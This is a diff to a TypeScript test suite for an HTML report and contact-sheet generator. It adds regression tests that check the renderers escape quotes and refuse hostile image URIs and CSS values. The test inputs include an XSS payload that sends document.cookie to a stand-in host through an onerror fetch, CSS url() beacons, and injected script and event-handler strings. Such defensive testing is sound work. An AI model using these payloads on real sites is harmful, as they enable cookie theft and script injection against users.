@@ -14,6 +14,45 @@ describe("keepLast", () => {
   it("escapes and glues the last word", () => {
     expect(keepLast("a <b> c")).toBe("a &lt;b&gt;&nbsp;c");
   });
+  it("escapes double and single quotes too", () => {
+    expect(keepLast(`say "hi" it's`)).toBe("say &quot;hi&quot;&nbsp;it&#39;s");
+  });
+});
+
+describe("attribute and url() injection (C1)", () => {
+  const base = gabby.first_section as FirstSection;
+  const evilLogo = `data:image/png"onerror="fetch('https://x/'+document.cookie);base64,AAAA`;
+  const evilPhoto = "data:image/png;base64,AA');background:url('https://x.test/beacon";
+
+  it("a logo URI with a quote never produces an attribute break", () => {
+    expect(() => firstSectionHtml(base, IMG, evilLogo)).toThrow(/image/);
+  });
+  it("a photo URI that would close url() is refused", () => {
+    expect(() => firstSectionHtml(base, evilPhoto)).toThrow(/image/);
+  });
+  it("contact sheet and report refuse a non-image URI", () => {
+    expect(() => contactSheetHtml(evilLogo, [IMG])).toThrow(/image/);
+    expect(() => contactSheetHtml(IMG, [evilPhoto])).toThrow(/image/);
+    expect(() => fillReport(gabby, { before: evilLogo, after: imgs.after })).toThrow(/image/);
+  });
+  it("accepts plain base64 image data URIs, svg included", () => {
+    const h = firstSectionHtml(base, IMG, "data:image/svg+xml;base64,PHN2Zy8+");
+    expect(h).toContain('<img src="data:image/svg+xml;base64,PHN2Zy8+"');
+    expect(h).not.toContain("<svg");
+  });
+  it("CSS values from the mockup are kept to safe characters", () => {
+    const h = firstSectionHtml({
+      ...base,
+      heading_font: `Lora',serif;}</style><script>x()</script>`,
+      nav_background: `#fff;background:url(https://x.test)`,
+      accent: `red" onmouseover="x()`,
+      photo_focus: `50% 40%') ;background:url('https://x.test`,
+    }, IMG);
+    expect(h).not.toContain("<script>");
+    expect(h).not.toContain("x.test");
+    expect(h).not.toContain("onmouseover");
+    expect(h).not.toMatch(/font-family:'[^']*[;}<]/);
+  });
 });
 
 describe("fillReport", () => {
@@ -45,9 +84,9 @@ describe("fillReport", () => {
   });
   it("NAME_POSS handles apostrophes and quotes in aria-label", () => {
     const out = fillReport({ ...gabby, first_name: "D'Andre" }, imgs);
-    expect(out).toContain('aria-label="D\'Andre\'s new first section on a computer and phone"');
+    expect(out).toContain('aria-label="D&#39;Andre&#39;s new first section on a computer and phone"');
     const q = fillReport({ ...gabby, first_name: 'A"B' }, imgs);
-    expect(q).toContain('aria-label="A&quot;B\'s new first section');
+    expect(q).toContain('aria-label="A&quot;B&#39;s new first section');
   });
   it("rewrites every tour link with UTM", () => {
     const utm = "https://capturedsites.com/tour/?utm_source=homepage-fixes&utm_medium=pdf&utm_campaign=homepage-fixes";
@@ -85,23 +124,23 @@ describe("firstSectionHtml", () => {
 
 describe("contactSheetHtml", () => {
   it("labels up to 3 photos and TODAY", () => {
-    const h = contactSheetHtml(IMG, ["data:a", "data:b", "data:c", "data:d"]);
+    const h = contactSheetHtml(IMG, ["data:image/png;base64,AAAA", "data:image/png;base64,BBBB", "data:image/png;base64,CCCC", "data:image/png;base64,DDDD"]);
     expect(h).toContain("TODAY");
     expect(h).toContain(">3<");
-    expect(h).not.toContain("data:d");
+    expect(h).not.toContain("data:image/png;base64,DDDD");
     expect(h).toContain("width:1600px;height:900px");
   });
 
   it("shows each photo whole (contain on #1a1a1a), not cropped", () => {
-    const h = contactSheetHtml(IMG, ["data:a", "data:b", "data:c"]);
+    const h = contactSheetHtml(IMG, ["data:image/png;base64,AAAA", "data:image/png;base64,BBBB", "data:image/png;base64,CCCC"]);
     expect(h).not.toContain("object-fit:cover");
-    const cells = h.match(/<div style="position:relative;flex:1;min-height:0;background:#1a1a1a"><img src="data:[abc]" alt="" style="[^"]*object-fit:contain[^"]*">/g) ?? [];
+    const cells = h.match(/<div style="position:relative;flex:1;min-height:0;background:#1a1a1a"><img src="data:image\/png;base64,(AAAA|BBBB|CCCC)" alt="" style="[^"]*object-fit:contain[^"]*">/g) ?? [];
     expect(cells).toHaveLength(3);
     expect(h).toContain("width:1600px;height:900px");
   });
 
   it("puts TODAY in the bottom-left corner (off the site's logo) and the photo numbers top-left", () => {
-    const h = contactSheetHtml(IMG, ["data:a"]);
+    const h = contactSheetHtml(IMG, ["data:image/png;base64,AAAA"]);
     const label = (t: string) => h.match(new RegExp(`<div style="([^"]*)">${t}</div>`))?.[1] ?? "";
     expect(label("TODAY")).toContain("left:12px;bottom:12px");
     expect(label("TODAY")).not.toContain("top:");
